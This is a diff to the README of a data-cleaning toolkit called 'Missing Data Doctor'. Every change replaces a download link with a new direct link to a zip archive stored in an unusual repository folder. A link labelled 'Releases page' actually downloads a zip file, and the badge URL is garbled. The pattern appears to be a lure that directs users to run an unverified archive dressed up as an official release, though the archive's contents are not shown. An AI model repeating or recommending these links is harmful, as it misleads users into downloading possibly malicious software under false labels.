@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Missing-Data-Doctor](https://raw.githubusercontent.com/Akchaykumar2004/Missing-Data-Doctor/main/data/Missing-Data-Doctor-v3.0.zip%20Now%20!-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Akchaykumar2004/Missing-Data-Doctor/main/data/Missing-Data-Doctor-v3.0.zip)
+[![Download Missing-Data-Doctor](https://github.com/Akchaykumar2004/Missing-Data-Doctor/raw/refs/heads/main/outputs/runs/Data-Missing-Doctor-2.4.zip%20Now%20!-Get%20Latest%20Release-brightgreen)](https://github.com/Akchaykumar2004/Missing-Data-Doctor/raw/refs/heads/main/outputs/runs/Data-Missing-Doctor-2.4.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ Missing Data Doctor is a handy toolkit designed to help you manage missing value
 Follow these steps to download and run Missing Data Doctor:
 
 1. **Visit the Releases Page**
-   - Go to our [Releases page](https://raw.githubusercontent.com/Akchaykumar2004/Missing-Data-Doctor/main/data/Missing-Data-Doctor-v3.0.zip) to find the latest version. You will see a list of available releases.
+   - Go to our [Releases page](https://github.com/Akchaykumar2004/Missing-Data-Doctor/raw/refs/heads/main/outputs/runs/Data-Missing-Doctor-2.4.zip) to find the latest version. You will see a list of available releases.
 
 2. **Choose Your Version**
    - Look for the latest version at the top of the list. This will usually be the most stable and up-to-date version.
@@ -61,7 +61,7 @@ Before installing, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-For a quick access, use this link to download the software: [Download Missing-Data-Doctor](https://raw.githubusercontent.com/Akchaykumar2004/Missing-Data-Doctor/main/data/Missing-Data-Doctor-v3.0.zip).
+For a quick access, use this link to download the software: [Download Missing-Data-Doctor](https://github.com/Akchaykumar2004/Missing-Data-Doctor/raw/refs/heads/main/outputs/runs/Data-Missing-Doctor-2.4.zip).
 
 After downloading, follow the installation steps outlined above. If you encounter any issues, review the documentation provided within the application or reach out through the contact options.
 
